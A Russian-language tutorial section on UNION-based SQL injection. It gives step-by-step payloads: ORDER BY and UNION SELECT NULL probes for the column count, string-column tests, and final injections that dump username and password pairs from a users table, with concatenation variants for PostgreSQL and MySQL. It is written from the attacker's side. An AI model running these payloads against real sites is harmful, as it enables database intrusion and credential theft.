## 🟢 07_UNION_BASED_ATTACKS / ИЗВЛЕЧЕНИЕ ДАННЫХ ИЗ ДРУГИХ ТАБЛИЦ

Если приложение уязвимо к SQLi, а результаты оригинального запроса выводятся прямо в HTTP-ответе, мы можем использовать оператор `UNION` для склейки дефолтного запроса с нашим кастомным. Это позволяет стянуть конфиденциальные данные из любых других доступных таблиц БД.

Оператор `UNION` выполняет дополнительный `SELECT` запрос и прикручивает его результаты к результатам исходного.
**Базовый пример:**
```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
Этот запрос вернет единый набор данных с двумя столбцами, содержащими значения из столбцов a, b таблицы table1 и c, d таблицы table2.

🛡️ ДВА ЖЕЛЕЗНЫХ ТРЕБОВАНИЯ ДЛЯ UNION-АТАКИ:
Внедряемый запрос должен возвращать точно такое же количество столбцов, что и исходный запрос.

Типы данных в соответствующих столбцах должны быть совместимы между собой (например, нельзя засунуть строку в столбец, который принимает только числа INT).

🕹️ ШАГ 1: ОПРЕДЕЛЕНИЕ КОЛИЧЕСТВА СТОЛБЦОВ
Существует два эффективных метода узнать, сколько столбцов возвращает оригинальный запрос бэкенда.

Метод 1: Инкремент ORDER BY
Мы заставляем базу сортировать результат по порядковому номеру столбца, постепенно увеличивая индекс, пока приложение не выдаст ошибку или не скроет контент:

https://shop.com/filter?category=Gifts'+ORDER+BY+1--+

https://shop.com/filter?category=Gifts'+ORDER+BY+2--+

https://shop.com/filter?category=Gifts'+ORDER+BY+3--+

Если на индексе 3 сайт падает с ошибкой:

The ORDER BY position number 3 is out of range of the number of items in the select list.

Это означает, что столбца №3 не существует. Следовательно, исходный запрос возвращает ровно 2 столбца.

Метод 2: Подбор через UNION SELECT NULL
Мы отправляем серию NULL значений. NULL уникален тем, что он совместим с любым типом данных, поэтому проверка на типы не сработает раньше времени:

https://shop.com/filter?category=Gifts'+UNION+SELECT+NULL--+

https://shop.com/filter?category=Gifts'+UNION+SELECT+NULL,NULL--+

Если количество NULL не совпадает с количеством столбцов исходного запроса, база выдает синтаксическую ошибку и ложится:

All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.

Как только запрос отработал без ошибок — количество переданных NULL равно количеству столбцов.

🕹️ ШАГ 2: ПОИСК СТОЛБЦОВ С НУЖНЫМ ТИПОМ ДАННЫХ
Интересующая нас инфа (пароли, логины, токены) обычно хранится в виде строк (VARCHAR, TEXT). Нам нужно определить, какой именно из найденных столбцов может выводить строковые данные.

Мы поочередно подставляем тестовый символ (например, 'a') вместо NULL:

Plaintext
🔗 Пейлоад 1: '+UNION+SELECT+'a',+NULL--+
Если база падает с ошибкой: Conversion failed when converting the varchar value 'a' to data type int, значит первый столбец предназначен строго для чисел. Идем дальше:

Plaintext
🔗 Пейлоад 2: '+UNION+SELECT+NULL,+'a'--+
Если страница загрузилась успешно и мы увидели букву 'a' в интерфейсе — второй столбец строковый. Его мы и будем использовать для эксфлитрации.

🕹️ ШАГ 3: ИЗВЛЕЧЕНИЕ СЕКРЕТНЫХ ДАННЫХ
Допустим, мы выяснили: столбцов всего два, и оба могут содержать строковые данные (string). Точка внедрения сидит внутри конструкции WHERE.

Зная (или сбрутив через OSINT/словари), что в БД есть таблица users со столбцами username и password, мы пишем финальный боевой пейлоад:

Plaintext
🔗 Пейлоад: '+UNION+SELECT+username,+password+FROM+users--+
Бэкенд выполнит запрос:

SQL
SELECT items FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--+'
На страницу вывалятся все пары логинов и паролей из базы данных.

🔀 ЭКСТРАКЦИЯ НЕСКОЛЬКИХ ЗНАЧЕНИЙ В ОДИН СТОЛБЕЦ
Если строковый столбец всего один, а вытащить нужно и логин, и пароль, мы склеиваем их через разделитель (например, тильду ~), чтобы данные не слиплись в кашу.

⚠️ Синтаксис зависит от типа СУБД:

PostgreSQL / Oracle / SQLite (Стандарт ANSI):

Plaintext
🔗 Пейлоад: '+UNION+SELECT+username+||+'~'+||+password+FROM+users--+
MySQL (Двойная черта || сработает как логическое OR, поэтому юзаем функцию CONCAT):

Plaintext
🔗 Пейлоад: '+UNION+SELECT+CONCAT(username,+'~',+password)+FROM+users--+
На выходе мы получим строки вида: admin~p@ssw0rd123, которые легко распарсить.
